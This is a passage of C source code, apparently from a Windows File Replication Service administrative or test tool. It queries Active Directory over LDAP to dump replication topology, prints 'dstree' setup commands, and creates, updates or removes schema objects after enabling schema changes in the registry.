        WStatus = DsBind(DcInfo->DomainControllerName, NULL, &Handle);
        if (!WIN_SUCCESS(WStatus)) {
            fprintf(stderr, "ERROR - DsBind(%ws); WStatus %d %08x\n",
                    DcInfo->DomainControllerName,
                    WStatus,
                    WStatus);
            WStatus = DsBind(DcInfo->DomainControllerAddress, NULL, &Handle);
            if (!WIN_SUCCESS(WStatus)) {
                fprintf(stderr, "ERROR - DsBind(%ws); WStatus %d %08x\n",
                        DcInfo->DomainControllerAddress,
                        WStatus,
                        WStatus);
            } else {
                printf("DsBind(%ws) succeeded\n", DcInfo->DomainControllerAddress);
            }
        } else {
            printf("DsBind(%ws) succeeded\n", DcInfo->DomainControllerName);
        }
    }

    //
    // Find the naming context that begins with CN=Configuration
    //
    //
    // Computers
    //
    DesiredAttrs[0] = ATTR_CN;
    DesiredAttrs[1] = ATTR_SAM;
    DesiredAttrs[2] = ATTR_DNS_HOST_NAME;
    DesiredAttrs[3] = ATTR_DN;
    DesiredAttrs[4] = ATTR_COMPUTER_REF_BL;
    DesiredAttrs[5] = ATTR_SERVER_REF;
    DesiredAttrs[6] = ATTR_SERVER_REF_BL;
    DesiredAttrs[7] = ATTR_USER_ACCOUNT_CONTROL;
    DesiredAttrs[8] = NULL;
    if (LdapSearch(Ldap, DefaultDn, LDAP_SCOPE_SUBTREE, CATEGORY_COMPUTER,
                   DesiredAttrs, 0, &LdapMsg, FALSE)) {
        //
        // Scan the entries returned from ldap_search
        //
        for (LdapEntry = ldap_first_entry(Ldap, LdapMsg);
             LdapEntry != NULL;
             LdapEntry = ldap_next_entry(Ldap, LdapEntry)) {
            NextDn = DumpAttrs(Ldap, LdapEntry, DefaultDn, DesiredAttrs, L"");
            FREE(NextDn);
            NextDn = FindValue(Ldap, LdapEntry, ATTR_DN);
            if (NextDn && HANDLE_IS_VALID(Handle)) {
                Crackee = &NextDn;
                WStatus = DsCrackNames(Handle,
                                       DS_NAME_NO_FLAGS,
                                       // DS_NAME_FLAG_SYNTACTICAL_ONLY,

                                       DS_FQDN_1779_NAME,

                                       DS_NT4_ACCOUNT_NAME,
                                       //DS_CANONICAL_NAME,

                                       1,
                                       Crackee,
                                       &Cracked);
                if (!WIN_SUCCESS(WStatus)) {
                    printf("ERROR - Cracking name; WStatus %d\n", WStatus);
                } else if (Cracked &&
                           Cracked->cItems &&
                           Cracked->rItems) {
                        if (Cracked->rItems->status) {
                            printf("    ERROR - Can't crack name; status %d\n",
                                   Cracked->rItems->status);
                        } else {
                            printf("    Cracked Domain : %ws\n",
                                   Cracked->rItems->pDomain);
                            printf("    Cracked Account: %ws\n",
                                   Cracked->rItems->pName);
                    }
                    DsFreeNameResult(Cracked);
                    Cracked = NULL;
                }
            }
            if (NextDn) {
                DumpSubscriptions(Ldap, NextDn);
                FREE(NextDn);
            }
        }
        ldap_msgfree(LdapMsg);
        LdapMsg = NULL;
    }

//out:
    if (HANDLE_IS_VALID(Handle)) {
        DsUnBind(&Handle);
    }
    FREE(DefaultDn);
}


VOID
DumpDsDsa(
    IN PLDAP    Ldap,
    IN PWCHAR   ParentDn
    )
/*++
Routine Description:

Arguments:

Return Value:
    None.
--*/
{
    PWCHAR          DesiredAttrs[16];
    PLDAPMessage    LdapMsg             = NULL;
    PLDAPMessage    LdapEntry           = NULL;
    PWCHAR          NextDn              = NULL;

    //
    // Servers
    //
    DesiredAttrs[0] = ATTR_CN;
    DesiredAttrs[1] = ATTR_DN;
    DesiredAttrs[2] = ATTR_SCHEDULE;
    DesiredAttrs[3] = ATTR_SERVER_REF;
    DesiredAttrs[4] = NULL;
    if (LdapSearch(Ldap, ParentDn, LDAP_SCOPE_ONELEVEL, CATEGORY_NTDS_DSA,
                   DesiredAttrs, 0, &LdapMsg, FALSE)) {
        //
        // Scan the entries returned from ldap_search
        //
        for (LdapEntry = ldap_first_entry(Ldap, LdapMsg);
             LdapEntry != NULL;
             LdapEntry = ldap_next_entry(Ldap, LdapEntry)) {
            NextDn = DumpAttrs(Ldap, LdapEntry, ParentDn, DesiredAttrs, L"    ");
            if (NextDn) {
                DumpCxtions(Ldap, NextDn);
                FREE(NextDn);
            }
        }
        ldap_msgfree(LdapMsg);
        LdapMsg = NULL;
    }
}


VOID
DumpSysVolWorld(
    IN PLDAP Ldap
    )
/*++
Routine Description:

Arguments:
    Ldap

Return Value:
    None.
--*/
{
    PWCHAR          DesiredAttrs[16];
    PWCHAR          NextDn              = NULL;
    PLDAPMessage    LdapMsg             = NULL;
    PLDAPMessage    LdapEntry           = NULL;
    PWCHAR          ConfigDn            = NULL;
    PWCHAR          SitesDn             = NULL;

    //
    // Return all of the values for the attribute namingContexts
    //
    ConfigDn = GetRootDn(Ldap, CONFIG_NAMING_CONTEXT);
    if (!ConfigDn) {
        return;
    }
    SitesDn = ExtendDn(ConfigDn, CN_SITES);

    //
    // Setting
    //
    DesiredAttrs[0] = ATTR_CN;
    DesiredAttrs[1] = ATTR_DNS_HOST_NAME;
    DesiredAttrs[2] = ATTR_DN;
    DesiredAttrs[3] = ATTR_SERVER_REF;
    DesiredAttrs[4] = ATTR_SERVER_REF_BL;
    DesiredAttrs[5] = NULL;
    if (LdapSearch(Ldap, SitesDn,  LDAP_SCOPE_SUBTREE, CATEGORY_SERVER,
                   DesiredAttrs, 0, &LdapMsg, FALSE)) {
        //
        // Scan the entries returned from ldap_search
        //
        for (LdapEntry = ldap_first_entry(Ldap, LdapMsg);
             LdapEntry != NULL;
             LdapEntry = ldap_next_entry(Ldap, LdapEntry)) {
            NextDn = DumpAttrs(Ldap, LdapEntry, SitesDn, DesiredAttrs, L"");
            if (NextDn) {
                FREE(NextDn);
            }
            NextDn = FindValue(Ldap, LdapEntry, ATTR_DN);
            if (NextDn) {
                DumpDsDsa(Ldap, NextDn);
                FREE(NextDn);
            }
        }
        ldap_msgfree(LdapMsg);
        LdapMsg = NULL;
    }
//out:
    FREE(ConfigDn);
    FREE(SitesDn);
}


VOID
ScriptCxtions(
    IN PLDAP    Ldap,
    IN PWCHAR   Set,
    IN PWCHAR   ServerDn
    )
/*++
Routine Description:

Arguments:

Return Value:
    None.
--*/
{
    PWCHAR          DesiredAttrs[16];
    PLDAPMessage    LdapMsg             = NULL;
    PLDAPMessage    LdapEntry           = NULL;
    PWCHAR          NextDn              = NULL;
    PWCHAR          From                = NULL;
    PWCHAR          Partner             = NULL;
    PWCHAR          Partners            = NULL;
    PWCHAR          Server              = NULL;
    PWCHAR          Tmp                 = NULL;

    Server = MakeRdn(ServerDn);

    //
    // Cxtions
    //
    DesiredAttrs[0] = ATTR_FROM_SERVER;
    DesiredAttrs[1] = NULL;
    if (LdapSearch(Ldap, ServerDn, LDAP_SCOPE_ONELEVEL, CATEGORY_CXTION,
                   DesiredAttrs, 0, &LdapMsg, FALSE)) {
        //
        // Scan the entries returned from ldap_search
        //
        for (LdapEntry = ldap_first_entry(Ldap, LdapMsg);
             LdapEntry != NULL;
             LdapEntry = ldap_next_entry(Ldap, LdapEntry)) {
            From = FindValue(Ldap, LdapEntry, ATTR_FROM_SERVER);
            if (From) {
                Partner = MakeRdn(From);
                if (Partner) {
                    if (Partners) {
                        Tmp = Partners;
                        Partners = FrsWcsCat(Tmp, L" ");
                        FREE(Tmp);
                        Tmp = Partners;
                        Partners = FrsWcsCat(Tmp, Partner);
                        FREE(Tmp);
                        FREE(Partner);
                    } else {
                        Partners = Partner;
                    }
                }
                FREE(From);
            }
        }
        ldap_msgfree(LdapMsg);
        LdapMsg = NULL;
    }
    if (Partners) {
        printf("dstree /i %ws %ws %ws\n", Set, Server, Partners);
    }
    FREE(Server);
}


VOID
GetRootAndStage(
    IN  PLDAP   Ldap,
    IN  PWCHAR  SubscriberDn,
    OUT PWCHAR  *Root,
    OUT PWCHAR  *Stage
    )
/*++
Routine Description:

Arguments:

Return Value:
    None.
--*/
{
    PWCHAR          DesiredAttrs[16];
    PLDAPMessage    LdapMsg             = NULL;
    PLDAPMessage    LdapEntry           = NULL;

    *Root = NULL;
    *Stage = NULL;

    //
    // Subscriber
    //
    DesiredAttrs[0] = ATTR_REPLICA_ROOT;
    DesiredAttrs[1] = ATTR_REPLICA_STAGE;
    DesiredAttrs[2] = NULL;
    if (LdapSearch(Ldap, SubscriberDn, LDAP_SCOPE_BASE, CATEGORY_SUBSCRIBER,
                   DesiredAttrs, 0, &LdapMsg, TRUE)) {
        LdapEntry = ldap_first_entry(Ldap, LdapMsg);
        if (LdapEntry) {
            *Root = FindValue(Ldap, LdapEntry, ATTR_REPLICA_ROOT);
            *Stage = FindValue(Ldap, LdapEntry, ATTR_REPLICA_STAGE);
        }
        ldap_msgfree(LdapMsg);
        LdapMsg = NULL;
    }
}


VOID
ScriptMembers(
    IN PLDAP    Ldap,
    IN PWCHAR   SetDn,
    IN BOOL     ScriptingServers
    )
/*++
Routine Description:

Arguments:

Return Value:
    None.
--*/
{
    PWCHAR          DesiredAttrs[16];
    PLDAPMessage    LdapMsg             = NULL;
    PLDAPMessage    LdapEntry           = NULL;
    PWCHAR          NextDn              = NULL;
    PWCHAR          Set                 = NULL;
    PWCHAR          Cn                  = NULL;
    PWCHAR          Root                = NULL;
    PWCHAR          Stage               = NULL;
    PWCHAR          MemberBl            = NULL;

    Set = MakeRdn(SetDn);

    //
    // Servers
    //
    DesiredAttrs[0] = ATTR_CN;
    DesiredAttrs[1] = ATTR_REPLICA_ROOT;
    DesiredAttrs[2] = ATTR_REPLICA_STAGE;
    DesiredAttrs[3] = ATTR_MEMBER_REF_BL;
    DesiredAttrs[4] = NULL;
    if (LdapSearch(Ldap, SetDn, LDAP_SCOPE_ONELEVEL, CATEGORY_MEMBER,
                   DesiredAttrs, 0, &LdapMsg, FALSE)) {
        //
        // Scan the entries returned from ldap_search
        //
        for (LdapEntry = ldap_first_entry(Ldap, LdapMsg);
             LdapEntry != NULL;
             LdapEntry = ldap_next_entry(Ldap, LdapEntry)) {
            if (ScriptingServers) {
                Cn = FindValue(Ldap, LdapEntry, ATTR_CN);
                MemberBl = FindValue(Ldap, LdapEntry, ATTR_MEMBER_REF_BL);
                if (MemberBl) {
                    GetRootAndStage(Ldap, MemberBl, &Root, &Stage);
                }
                if (Cn) {
                    if (Root && Stage) {
                        printf("dstree /c %ws %ws %ws %ws\n", Set, Cn, Root, Stage);
                    } else {
                        printf("dstree /c %ws %ws\n", Set, Cn);
                    }
                    FREE(Cn);
                    FREE(Root);
                    FREE(Stage);
                    FREE(MemberBl);
                }
            } else {
                NextDn = GetNextDn(Ldap, LdapEntry, SetDn);
                if (NextDn) {
                    ScriptCxtions(Ldap, Set, NextDn);
                    FREE(NextDn);
                }
            }
        }
        ldap_msgfree(LdapMsg);
        LdapMsg = NULL;
    }
    FREE(Set);
}


VOID
ScriptSets(
    IN PLDAP    Ldap,
    IN PWCHAR   ParentDn
    )
/*++
Routine Description:

Arguments:

Return Value:
    None.
--*/
{
    PWCHAR          DesiredAttrs[16];
    PLDAPMessage    LdapMsg             = NULL;
    PLDAPMessage    LdapEntry           = NULL;
    PWCHAR          NextDn              = NULL;

    //
    // Sets
    //
    DesiredAttrs[0] = ATTR_CN;
    DesiredAttrs[1] = NULL;
    if (LdapSearch(Ldap, ParentDn, LDAP_SCOPE_ONELEVEL, CATEGORY_REPLICA_SET,
                   DesiredAttrs, 0, &LdapMsg, FALSE)) {
        //
        // Scan the entries returned from ldap_search
        //
        for (LdapEntry = ldap_first_entry(Ldap, LdapMsg);
             LdapEntry != NULL;
             LdapEntry = ldap_next_entry(Ldap, LdapEntry)) {
            NextDn = GetNextDn(Ldap, LdapEntry, ParentDn);
            if (NextDn) {
                ScriptMembers(Ldap, NextDn, TRUE);
                FREE(NextDn);
            }
        }
        //
        // Scan the entries returned from ldap_search
        //
        for (LdapEntry = ldap_first_entry(Ldap, LdapMsg);
             LdapEntry != NULL;
             LdapEntry = ldap_next_entry(Ldap, LdapEntry)) {
            NextDn = GetNextDn(Ldap,
                               LdapEntry,
                               ParentDn);
            if (NextDn) {
                ScriptMembers(Ldap, NextDn, FALSE);
                FREE(NextDn);
            }
        }
        ldap_msgfree(LdapMsg);
        LdapMsg = NULL;
    }
}


VOID
ScriptReplicationWorld(
    VOID
    )
/*++
Routine Description:

Arguments:
    None.

Return Value:
    None.
--*/
{
    PWCHAR          DesiredAttrs[16];
    PLDAP           Ldap                = NULL;
    PWCHAR          ConfigDn            = NULL;
    PWCHAR          ServicesDn          = NULL;
    PWCHAR          NextDn              = NULL;
    PWCHAR          SettingsDn          = NULL;
    PLDAPMessage    LdapMsg             = NULL;
    PLDAPMessage    LdapEntry           = NULL;

    //
    // Bind to the ds
    //
    Ldap = FrsDsOpenDs();
    if (!Ldap) {
        return;
    }

    //
    // Services
    //
    ConfigDn = GetRootDn(Ldap, CONFIG_NAMING_CONTEXT);
    if (!ConfigDn) {
        return;
    }
    ServicesDn = ExtendDn(ConfigDn, CN_SERVICES);
    SettingsDn = ExtendDn(ServicesDn, CN_TEST_SETTINGS);
    ScriptSets(Ldap, SettingsDn);

#if 0
Don't script all of the settings; only the test settings
    //
    // Setting
    //
    DesiredAttrs[0] = ATTR_CN;
    DesiredAttrs[1] = NULL;
    if (LdapSearch(Ldap, ServicesDn, LDAP_SCOPE_ONELEVEL, CATEGORY_NTFRS_SETTINGS,
                   DesiredAttrs, 0, &LdapMsg, FALSE)) {
        //
        // Scan the entries returned from ldap_search
        //
        for (LdapEntry = ldap_first_entry(Ldap, LdapMsg);
             LdapEntry != NULL;
             LdapEntry = ldap_next_entry(Ldap, LdapEntry)) {
            NextDn = GetNextDn(Ldap, LdapEntry, ServicesDn);
            if (NextDn) {
                ScriptSets(Ldap, NextDn);
                FREE(NextDn);
            }
        }
        ldap_msgfree(LdapMsg);
        LdapMsg = NULL;
    }
#endif 0

    ldap_unbind(Ldap);
    FREE(ServicesDn);
    FREE(ConfigDn);
    FREE(SettingsDn);
}


VOID
DoListSchema(
    IN PLDAP                Ldap,
    IN PWCHAR               SchemaDn,
    IN struct AlterClass    *Lists[]
    )
/*++
Routine Description:
    Dump schema

Arguments:
    None.

Return Value:
    None.
--*/
{
    ULONG   i, j;
    ULONG   NumAttrs;
    DWORD   LStatus;
    PWCHAR  Attrs[64];
    PWCHAR  Dn          = NULL;

    for (j = 0; Lists[j]; ++j) {
        Dn = ExtendDn(SchemaDn, Lists[j]->Cn);
        NumAttrs = 0;
        for (i = 0; Lists[j]->AlterAttrs[i].Attr; ++i) {
            if (NumAttrs) {
                if (!wcscmp(Attrs[NumAttrs - 1],
                            Lists[j]->AlterAttrs[i].Attr)) {
                    continue;
                }
            }
            Attrs[NumAttrs++] = Lists[j]->AlterAttrs[i].Attr;
        }
        if (NumAttrs) {
            Attrs[NumAttrs + 0] = ATTR_DN;
            Attrs[NumAttrs + 1] = ATTR_SYSTEM_FLAGS;
            Attrs[NumAttrs + 2] = ATTR_SYSTEM_MAY_CONTAIN;
            Attrs[NumAttrs + 3] = ATTR_SYSTEM_MUST_CONTAIN;
            Attrs[NumAttrs + 4] = ATTR_SYSTEM_POSS_SUPERIORS;
            Attrs[NumAttrs + 5] = NULL;
            DumpValues(Ldap, Dn, LDAP_SCOPE_BASE, CATEGORY_ANY, Attrs, FALSE);
        }
        FREE(Dn);
    }
}


VOID
ListSchema(
    VOID
    )
/*++
Routine Description:
    Dump schema

Arguments:
    None.

Return Value:
    None.
--*/
{
    ULONG           i, j;
    ULONG           NumAttrs;
    DWORD           LStatus;
    PLDAP           Ldap        = NULL;
    PWCHAR          SchemaDn    = NULL;
    PWCHAR          Dn          = NULL;
    LDAPMod         **Mod       = NULL;
    PWCHAR          Attrs[64];

    //
    // Bind to the ds
    //
    Ldap = FrsDsOpenDs();
    if (!Ldap) {
        return;
    }
    SchemaDn = GetRootDn(Ldap, SCHEMA_NAMING_CONTEXT);
    if (!SchemaDn) {
        return;
    }
    DoListSchema(Ldap, SchemaDn, AlterSchema);
    DoListSchema(Ldap, SchemaDn, CreateClasses);
    DoListSchema(Ldap, SchemaDn, CreateAttributes);
    ldap_unbind(Ldap);
    FREE(SchemaDn);
}


VOID
CreateSchema(
    IN PLDAP                Ldap,
    IN PWCHAR               SchemaDn,
    IN struct AlterClass    *Creates[],
    IN DWORD                ExpectedError
    )
/*++
Routine Description:

Arguments:

Return Value:
    None.
--*/
{
    DWORD   LStatus;
    ULONG   i, j;
    PWCHAR  Dn          = NULL;
    LDAPMod **Mod       = NULL;

    //
    // CREATE ATTRIBUTES OR CLASSES
    //
    for (j = 0; Creates[j]; ++j) {
        Dn = ExtendDn(SchemaDn, Creates[j]->Cn);
        printf("    %-30ws: CRE\n", Creates[j]->Cn);
        for (i = 0; Creates[j]->AlterAttrs[i].Attr; ++i) {
            AddMod(Creates[j]->AlterAttrs[i].Attr,
                   Creates[j]->AlterAttrs[i].Value,
                   &Mod);
        }
        LStatus = ldap_add_s(Ldap, Dn, Mod);
        if (LStatus != LDAP_SUCCESS &&
            LStatus != ExpectedError) {
            fprintf(stderr, "%-30ws  ERROR %ws\n",
                    L"", ldap_err2string(LStatus));
        }
        FreeMod(&Mod);
        FREE(Dn);
    }
}


VOID
UpdateSchema(
    IN PLDAP                Ldap,
    IN PWCHAR               SchemaDn,
    IN BOOL                 Hammering,
    IN struct AlterClass    *Updates[]
    )
/*++
Routine Description:

Arguments:

Return Value:
    None.
--*/
{
    DWORD   LStatus;
    ULONG   i, j;
    PWCHAR  Dn          = NULL;
    LDAPMod **Mod       = NULL;

    //
    // ALTER EXISTING CLASSES
    //
    for (j = 0; Updates[j]; ++j) {
        Dn = ExtendDn(SchemaDn, Updates[j]->Cn);
        for (i = 0; Updates[j]->AlterAttrs[i].Attr; ++i) {
            AddMod(Updates[j]->AlterAttrs[i].Attr,
                   Updates[j]->AlterAttrs[i].Value,
                   &Mod);
            if (Hammering) {
                printf("    %-30ws: ADD %ws = %ws\n",
                       Updates[j]->Cn,
                       Updates[j]->AlterAttrs[i].Attr,
                       Updates[j]->AlterAttrs[i].Value);
                LStatus = ldap_modify_s(Ldap, Dn, Mod);
                if (LStatus != LDAP_SUCCESS &&
                    LStatus != LDAP_ATTRIBUTE_OR_VALUE_EXISTS) {
                    fprintf(stderr, "%-30ws  ERROR %ws\n",
                            L"", ldap_err2string(LStatus));
                }
            } else {
                printf("    %-30ws: DEL %ws = %ws\n",
                       Updates[j]->Cn,
                       Updates[j]->AlterAttrs[i].Attr,
                       Updates[j]->AlterAttrs[i].Value);
                Mod[0]->mod_op = LDAP_MOD_DELETE;
                LStatus = ldap_modify_s(Ldap, Dn, Mod);
                if (LStatus != LDAP_SUCCESS &&
                    LStatus != LDAP_NO_SUCH_ATTRIBUTE &&
                    LStatus != LDAP_NO_SUCH_OBJECT) {
                    fprintf(stderr, "%-30ws  ERROR %ws\n",
                            L"", ldap_err2string(LStatus));
                }
            }
            FreeMod(&Mod);
        }
        FREE(Dn);
    }
}


VOID
DeleteSchema(
    IN PLDAP                Ldap,
    IN PWCHAR               SchemaDn,
    IN struct AlterClass    *Deletes[],
    IN DWORD                ExpectedError
    )
/*++
Routine Description:

Arguments:

Return Value:
    None.
--*/
{
    PWCHAR Dn       = NULL;
    DWORD  LStatus;
    ULONG  j;

    //
    // DELETE ATTRIBUTES OR CLASSES
    //
    for (j = 0; Deletes[j]; ++j) {
        Dn = ExtendDn(SchemaDn, Deletes[j]->Cn);
        printf("    %-30ws: DEL\n", Deletes[j]->Cn);
        LStatus = ldap_delete_s(Ldap, Dn);
        if (LStatus != LDAP_SUCCESS &&
            LStatus != ExpectedError) {
            fprintf(stderr, "%-30ws  ERROR %ws\n",
                    L"", ldap_err2string(LStatus));
        }
        FREE(Dn);
    }
}


VOID
RefreshSchema(
    IN PLDAP Ldap
    )
/*++
Routine Description:

Arguments:
    None.

Return Value:
    None.
--*/
{
    DWORD           LStatus;
    LDAPMod         **Mod               = NULL;

    AddMod(L"schemaUpdateNow", L"1", &Mod);
    LStatus = ldap_modify_s(Ldap, L"", Mod);
    FreeMod(&Mod);
    if (LStatus != LDAP_SUCCESS) {
        fprintf(stderr, "Can't force schema update; %ws\n",
                ldap_err2string(LStatus));
        printf("Waiting 5 minutes for schema updates to take effect\n");
        Sleep(5 * 60 * 1000);
    }
}

#define NTDS_SERVICE        L"NTDS"
#define NTDS_ROOT           L"System\\CurrentControlSet\\Services\\" NTDS_SERVICE
#define NTDS_PARAMETERS     NTDS_ROOT L"\\Parameters"
#define NTDS_UPDATE_SCHEMA  L"Schema Update Allowed"
#define NTDS_DELETE_SCHEMA  L"Schema Delete Allowed"


BOOL
PutRegDWord(
    IN PWCHAR   FQKey,
    IN PWCHAR   Value,
    IN DWORD    DWord
    )
/*++
Routine Description:
    This function writes a keyword value into the registry.

Arguments:
    HKey    - Key to be read
    Param   - value string to update
    DWord   - dword to be written

Return Value:
    TRUE    - Success
    FALSE   - Not
--*/
{
#define  DEBSUB  "PutRegDWord:"
    HKEY    HKey;
    DWORD   WStatus;

    //
    // Open the key
    //
    WStatus = RegOpenKey(HKEY_LOCAL_MACHINE, FQKey, &HKey);
    if (!WIN_SUCCESS(WStatus)) {
        fprintf(stderr, "[%ws] \"%ws\" Could not open. WStatus %d\n",
            FQKey, Value, WStatus);
        return FALSE;
    }
    //

    //
    // Write the value
    //
    WStatus = RegSetValueEx(HKey,
                            Value,
                            0,
                            REG_DWORD,
                            (PUCHAR)&DWord,
                            sizeof(DWord));
    if (!WIN_SUCCESS(WStatus)) {
        fprintf(stderr, "%ws: Value not written; WStatus %d\n", Value, WStatus);
        return FALSE;
    }
    return TRUE;
}


VOID
HammerSchema(
    IN BOOL Hammering
    )
/*++
Routine Description:

Arguments:
    None.

Return Value:
    None.
--*/
{
    DWORD           LStatus;
    PLDAP           Ldap                = NULL;
    PWCHAR          SchemaDn            = NULL;
    PWCHAR          Dn                  = NULL;
    LDAPMod         **Mod               = NULL;
    ULONG           i, j;

    if (Hammering) {
        printf("UPDATING SCHEMA...\n");
        if (!PutRegDWord(NTDS_PARAMETERS, NTDS_UPDATE_SCHEMA, 1)) {
            fprintf(stderr, "Could not enable schema update\n");
            return;
        }
    } else {
        printf("RESTORING SCHEMA...\n");
        if (!PutRegDWord(NTDS_PARAMETERS, NTDS_UPDATE_SCHEMA, 1)) {
            fprintf(stderr, "Could not enable schema update\n");
            return;
        }
        if (!PutRegDWord(NTDS_PARAMETERS, NTDS_DELETE_SCHEMA, 1)) {
            fprintf(stderr, "Could not enable schema deletes\n");
            return;
        }
    }

    //
    // Bind to the ds
    //
    Ldap = FrsDsOpenDs();
    if (!Ldap) {
        return;
    }
    SchemaDn = GetRootDn(Ldap, SCHEMA_NAMING_CONTEXT);
    if (!SchemaDn) {
        return;
    }

    //
    // CREATE/DELETE ATTRIBUTES AND CLASSES
    //
    if (Hammering) {
        CreateSchema(Ldap,
                     SchemaDn,
                     CreateAttributes,
                     LDAP_ALREADY_EXISTS);
        RefreshSchema(Ldap);
        CreateSchema(Ldap,
                     SchemaDn,
                     CreateClasses,
                     LDAP_ALREADY_EXISTS);
        RefreshSchema(Ldap);
        UpdateSchema(Ldap,
                     SchemaDn,
                     Hammering,
                     AlterSchema);
    } else {
        UpdateSchema(Ldap,
                     SchemaDn,
                     Hammering,
                     AlterSchema);
        RefreshSchema(Ldap);
        DeleteSchema(Ldap,
                     SchemaDn,
                     CreateClasses,
                     LDAP_NO_SUCH_OBJECT);
        RefreshSchema(Ldap);
        DeleteSchema(Ldap,
                     SchemaDn,
                     CreateAttributes,
                     LDAP_NO_SUCH_OBJECT);
    }
    RefreshSchema(Ldap);
    if (Hammering) {
        printf("SCHEMA UPDATE COMPLETE\n");
    } else {
        printf("SCHEMA RESTORE COMPLETE\n");
    }
    ldap_unbind(Ldap);
    FREE(SchemaDn);
    return;
}


PWCHAR
GetCoDn(
    IN  PLDAP   Ldap,
    IN  PWCHAR  Member,
    OUT PWCHAR  *ServerDn
    )
/*++
Routine Description:
    Find the computer object for Member

Arguments:
    Ldap
    Member
    ServerDn

Return Value:
    Dn of computer object or NULL. Free with FREE.
--*/
{
    PWCHAR          *Values     = NULL;
    PLDAPMessage    LdapMsg     = NULL;
    PLDAPMessage    LdapEntry   = NULL;
    PWCHAR          CoDn        = NULL;
    PWCHAR          Attrs[16];
    WCHAR           Filter[MAX_PATH + 1];



    //
    // Find the default naming context
    //
    Values = GetValues(Ldap, CN_ROOT, ATTR_DEFAULT_NAMING_CONTEXT, TRUE);
    if (!Values) {
        return NULL;
    }
    //
    // Find the computer object with class=computer
    //
    swprintf(Filter,
             L"(&%s(sAMAccountName=%s$))",
             CATEGORY_COMPUTER,
             Member);

    Attrs[0] = ATTR_DN;
    Attrs[1] = ATTR_SERVER_REF;
    Attrs[2] = ATTR_SERVER_REF_BL;
    Attrs[3] = NULL;
    if (LdapSearch(Ldap, Values[0], LDAP_SCOPE_SUBTREE, Filter,
                   Attrs, 0, &LdapMsg, FALSE)) {
        LdapEntry = ldap_first_entry(Ldap, LdapMsg);
        if (LdapEntry) {
            CoDn = FindValue(Ldap, LdapEntry, ATTR_DN);
            if (ServerDn) {
                *ServerDn = FindValue(Ldap, LdapEntry, ATTR_SERVER_REF_BL);
                if (!*ServerDn) {
                    *ServerDn = FindValue(Ldap, LdapEntry, ATTR_SERVER_REF);
                }
            }
        }
        ldap_msgfree(LdapMsg);
    }
    if (CoDn) {
        return CoDn;
    }
    //
    // Find the computer object with class=computer (possible after
    // an NT4 to NT5 upgrade.
    //
    swprintf(Filter,
             L"(&%s(sAMAccountName=%s$))",
             CATEGORY_USER,
             Member);

    Attrs[0] = ATTR_DN;
    Attrs[1] = ATTR_SERVER_REF;
    Attrs[2] = ATTR_SERVER_REF_BL;
    Attrs[3] = NULL;
    if (LdapSearch(Ldap, Values[0], LDAP_SCOPE_SUBTREE, Filter,
                   Attrs, 0, &LdapMsg, FALSE)) {
        LdapEntry = ldap_first_entry(Ldap, LdapMsg);
        if (LdapEntry) {
            CoDn = FindValue(Ldap, LdapEntry, ATTR_DN);
            if (ServerDn) {
                *ServerDn = FindValue(Ldap, LdapEntry, ATTR_SERVER_REF_BL);
                if (!*ServerDn) {
                    *ServerDn = FindValue(Ldap, LdapEntry, ATTR_SERVER_REF);
                }
            }
        }
        ldap_msgfree(LdapMsg);
    }
    ldap_value_free(Values);
    return CoDn;
}


PWCHAR
GetSiteName(
    IN  PWCHAR  Member
    )
/*++
Routine Description:
    Retrieve this machine's site name. We assume the site name
    matches the site container's name in the DS.

Arguments:
    Member - corresponds to site container's name

Return Value:
    Site name or NULL. Free with FREE.
--*/
{
    DWORD   WStatus;
    PWCHAR  Name;
    PWCHAR  Site;

    //
    // Get this machine's DNS name
    //
    WStatus = DsGetSiteName(Member, &Name);
    if (!WIN_SUCCESS(WStatus)) {
        return NULL;
    }
    Site = FrsWcsDup(Name);
    NetApiBufferFree(Name);
    return Site;
}


PWCHAR
GetServerDn(
    IN PLDAP    Ldap,
    IN PWCHAR   Member
    )
/*++
Routine Description:
    Find our server object (assumes that machine name == server name)

Arguments:
    Ldap
    Member

Return Value:
    Server DN (if any)
--*/
{
    PWCHAR          *Values             = NULL;
    PWCHAR          ConfigDn            = NULL;
    PWCHAR          SitesDn             = NULL;
    PWCHAR          Site                = NULL;
    PWCHAR          SiteDn              = NULL;
    PWCHAR          ServersDn           = NULL;
    PWCHAR          ServerDn            = NULL;
    PWCHAR          SettingsDn          = NULL;
    PWCHAR          RealServerDn        = NULL;

    //
    // Return all of the values for the attribute namingContexts
    //
    ConfigDn = GetRootDn(Ldap, CONFIG_NAMING_CONTEXT);
    if (!ConfigDn) {
        return NULL;
    }
    SitesDn = ExtendDn(ConfigDn, CN_SITES);
    Site = GetSiteName(Member);
    if (!Site) {
        goto out;
    }
    SiteDn = ExtendDn(SitesDn, Site);
    ServersDn = ExtendDn(SiteDn, CN_SERVERS);
    ServerDn = ExtendDn(ServersDn, Member);
    SettingsDn = ExtendDn(ServerDn, CN_NTDS_SETTINGS);
    Values = GetValues(Ldap, SettingsDn, ATTR_DN, TRUE);
    if (!Values) {
        goto out;
    }
    RealServerDn = FrsWcsDup(Values[0]);

out:
    FREE(ConfigDn);
    FREE(SitesDn);
    FREE(SiteDn);
    FREE(Site);
    FREE(ServersDn);
    FREE(ServerDn);
    FREE(SettingsDn);
    return RealServerDn;
}


#define SIZEOF_EXTENSIONS   127
VOID
CreateReplicationWorld(
    IN DWORD    argc,
    IN PWCHAR   *Argv,
    IN BOOL     IsPrimary
    )
/*++
Routine Description:
    Create the required objects

Arguments:

Return Value:
    None.
--*/
{
    DWORD           WStatus;
    DWORD           LStatus;
    ULONG           ScheduleLength;
    PWCHAR          Member;
    PWCHAR          Set;
    PWCHAR          Root;
    PWCHAR          Stage;
    GUID            NewGuid;
    GUID            OldGuid;
    CHAR            Extensions[SIZEOF_EXTENSIONS];
    PLDAP           Ldap                = NULL;
    PWCHAR          CoDn                = NULL;
    PWCHAR          SubsDn              = NULL;
    PWCHAR          SubDn               = NULL;
    PWCHAR          Subscriber          = NULL;
    PWCHAR          ConfigDn            = NULL;
    PWCHAR          ServerDn            = NULL;
    PWCHAR          ServicesDn          = NULL;
    PWCHAR          SettingsDn          = NULL;
    PWCHAR          SetDn               = NULL;
    PWCHAR          MemberDn            = NULL;
    PLDAPMessage    LdapMsg             = NULL;
    PLDAPMessage    LdapEntry           = NULL;
    PSCHEDULE       Schedule            = NULL;
    PWCHAR          Cn                  = NULL;
    LDAPMod         **Mod               = NULL;

    Set = Argv[2];
    if (argc > 2) {
        Member = Argv[3];
    }
    if (argc > 3) {
        Root = Argv[4];
        Stage = Argv[5];
    }

    //
    // Bind to the ds
    //
    Ldap = FrsDsOpenDs();
    if (!Ldap) {
        return;
    }

    //
